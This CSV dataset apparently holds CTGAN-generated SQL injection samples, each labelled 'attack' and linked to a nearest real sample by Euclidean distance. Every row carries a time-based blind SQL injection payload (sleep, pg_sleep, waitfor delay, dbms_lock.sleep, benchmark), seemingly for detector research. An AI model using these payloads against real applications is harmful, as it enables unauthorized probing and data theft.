id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000022,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000212,7.158498723506362
CTGAN_000023,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000210,4.497288418170795
CTGAN_000024,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000153,10.11871957460799
CTGAN_000025,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,5.135016589260267
CTGAN_000026,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,5.079489973592341
CTGAN_000027,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000089,5.435586806074509
CTGAN_000028,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,6.864361432693284
CTGAN_000029,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000065,6.909421251872904
CTGAN_000030,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000207,7.586060820762372
CTGAN_000031,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,5.638057669077449
CTGAN_000032,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.574628050849614
CTGAN_000033,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.709919740839579
CTGAN_000034,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000114,6.95254521537811
CTGAN_000035,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,6.208105941203843
CTGAN_000036,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.76593227084437
CTGAN_000037,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000084,5.703961544592138
CTGAN_000038,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,7.041273174138831
CTGAN_000039,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.884365563738746
CTGAN_000040,attack,time,"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",nearest_attack_euclidean,R000236,7.8181802872311845
CTGAN_000041,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.433795071860789
CTGAN_000042,attack,time,"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000116,6.720427816750941
CTGAN_000043,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,6.344981461761043
CTGAN_000044,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000272,6.401550934689082
CTGAN_000045,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,6.1110070171319695
CTGAN_000046,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000109,6.097030437957366
CTGAN_000047,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,7.812979215288598
CTGAN_000048,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,4.241029708105061
CTGAN_000049,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,4.087944148358685
CTGAN_000050,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000136,4.661726165487761
CTGAN_000051,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000054,5.320059449173726
CTGAN_000052,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,6.182735223112693
CTGAN_000053,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.629921599955937
CTGAN_000054,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R000280,7.276098134930886
CTGAN_000055,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,4.938936422978676
CTGAN_000056,attack,time,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",nearest_attack_euclidean,R000249,6.345611505208318
CTGAN_000057,attack,time,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000276,6.336721614013116
CTGAN_000058,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,6.372258447331229
CTGAN_000059,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,5.317129046096138
CTGAN_000060,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000153,7.868218720028876
CTGAN_000061,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.3793862850305425
CTGAN_000062,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,4.984863034404389
CTGAN_000063,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000114,4.990506699419121
CTGAN_000064,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,6.762730843979433
CTGAN_000065,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,5.352503997853058
CTGAN_000066,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000207,7.2010573940660505
CTGAN_000067,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.992502477776168
CTGAN_000068,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.767833905895335
CTGAN_000069,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.156844830976651
CTGAN_000070,attack,time,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',nearest_attack_euclidean,R000203,6.8030934992603065
CTGAN_000071,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,5.5645427898391455
CTGAN_000072,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000225,6.826229049334668
CTGAN_000073,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,6.456540112662952
CTGAN_000074,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000207,7.232860191666124
CTGAN_000075,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,5.098598442105544
CTGAN_000076,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000062,5.881041838144887
CTGAN_000077,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,5.808694121367519
CTGAN_000078,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,6.552303136203978
CTGAN_000079,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R000074,5.91297249877877
CTGAN_000080,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000304,5.884805390168348
CTGAN_000081,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.240698284070314
CTGAN_000082,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000277,6.281006202626994
CTGAN_000083,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,5.169327589950784
CTGAN_000084,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000222,6.184235273764663
CTGAN_000085,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,5.811250263095507
CTGAN_000086,attack,time,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000078,7.396228745364143
CTGAN_000087,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,7.495976545009489
CTGAN_000088,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.551336846933604
CTGAN_000089,attack,time,1 or sleep  (  5  )  -- nrzf,nearest_attack_euclidean,R000270,6.487854451744855
CTGAN_000090,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000232,6.338197002054654
CTGAN_000091,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000151,6.445577686255591
CTGAN_000092,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000182,6.483711372262404
CTGAN_000093,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,6.484467386276814
CTGAN_000094,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.081327841729648
CTGAN_000095,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,7.259040098266006
CTGAN_000096,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,7.055310863068679
CTGAN_000097,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000272,4.887564166576951
CTGAN_000098,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000195,5.8972261260566965
CTGAN_000099,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",nearest_attack_euclidean,R000227,5.298223490851706
CTGAN_000100,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,8.042989745361803
CTGAN_000101,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R000280,6.404114491525922
CTGAN_000102,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,5.30461225325556
CTGAN_000103,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000081,4.203098306393211
CTGAN_000104,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,5.58345645550612
CTGAN_000105,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,6.1108982726972325
CTGAN_000106,attack,time,waitfor delay '0:0:5' and '%'  =  ',nearest_attack_euclidean,R000257,7.49534600690165
CTGAN_000107,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000188,9.745169217651304
CTGAN_000108,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000193,4.6210523458326564
CTGAN_000109,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000054,5.296303729743006
CTGAN_000110,attack,time,waitfor delay '0:0:5' and '%'  =  ',nearest_attack_euclidean,R000257,6.6227153445703095
CTGAN_000111,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000076,5.6652280482855195
CTGAN_000112,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000272,6.525845157264631
CTGAN_000113,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000076,6.865072134574548
CTGAN_000114,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,8.409862907112688
CTGAN_000115,attack,time,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000221,6.849393934941828
CTGAN_000116,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000079,5.068358896213329
CTGAN_000117,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000062,5.945108029911926
CTGAN_000118,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R000281,5.850618570404285
CTGAN_000119,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,6.304787608399247
CTGAN_000120,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,5.070017879838924
CTGAN_000121,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.052292850641772
CTGAN_000122,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.593288598246559
CTGAN_000123,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,6.042715610554422
CTGAN_000124,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,4.609422012874634
CTGAN_000125,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.795909733172425
CTGAN_000126,attack,time,waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,nearest_attack_euclidean,R000150,5.506231271708916
CTGAN_000127,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000096,5.180531264051737
CTGAN_000128,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000079,7.463581165690297
CTGAN_000129,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,4.949827649192313
CTGAN_000130,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,6.283893943742068
CTGAN_000131,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000222,7.0481644298286845
CTGAN_000132,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",nearest_attack_euclidean,R000137,7.1891993934262075
CTGAN_000133,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000062,6.420054699969862
CTGAN_000134,attack,time,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',nearest_attack_euclidean,R000203,7.989467150813804
CTGAN_000135,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,8.226768853788256
CTGAN_000136,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000114,5.145818289399383
CTGAN_000137,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000056,5.88341353330636
CTGAN_000138,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,10.90714559822133
CTGAN_000139,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.332315406442012
CTGAN_000140,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R000280,6.534069629649764
CTGAN_000141,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000092,6.783482651452851
CTGAN_000142,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000120,5.8834336403913134
CTGAN_000143,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.161708625067189
CTGAN_000144,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000079,5.787424824678586
CTGAN_000145,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.559408461693023
CTGAN_000146,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000123,6.753652665547867
CTGAN_000147,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,7.294128355224505
CTGAN_000148,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000096,6.708820688313697
CTGAN_000149,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,5.426243978259608
CTGAN_000150,attack,time,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000252,7.964372611609304
CTGAN_000151,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000114,6.848363882097779
CTGAN_000152,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000054,6.721129658880308
CTGAN_000153,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000157,7.771536679109432
CTGAN_000154,attack,time,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000119,6.1074402080999715
CTGAN_000155,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,4.629763686302665
CTGAN_000156,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",nearest_attack_euclidean,R000268,6.216910557957732
CTGAN_000157,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000114,5.984632715538167
CTGAN_000158,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,6.731348243138166
CTGAN_000159,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R000269,8.197709476235268
CTGAN_000160,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000164,6.4506992656578195
CTGAN_000161,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,6.093338624416204
CTGAN_000162,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,5.29896066101815
CTGAN_000163,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,7.3307973393454295
CTGAN_000164,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.22969519864384
CTGAN_000165,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.385792348915891
CTGAN_000166,attack,time,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000252,5.779906956388812
CTGAN_000167,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",nearest_attack_euclidean,R000268,6.9514982320534955
CTGAN_000168,attack,time,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,nearest_attack_euclidean,R000211,5.26798341361206
CTGAN_000169,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000153,8.075084938260598
CTGAN_000170,attack,time,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000119,6.159158510768318
CTGAN_000171,attack,time,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000245,6.778501363777922
CTGAN_000172,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.316474226269219
CTGAN_000173,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,7.462764784360309
CTGAN_000174,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",nearest_attack_euclidean,R000268,6.06924850127589
CTGAN_000175,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000053,5.335451573257664
CTGAN_000176,attack,time,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,nearest_attack_euclidean,R000211,6.338302750114239
CTGAN_000177,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000062,5.553966476482015
CTGAN_000178,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,8.912971723577597
CTGAN_000179,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,6.8761265964503515
CTGAN_000180,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.107446398914577
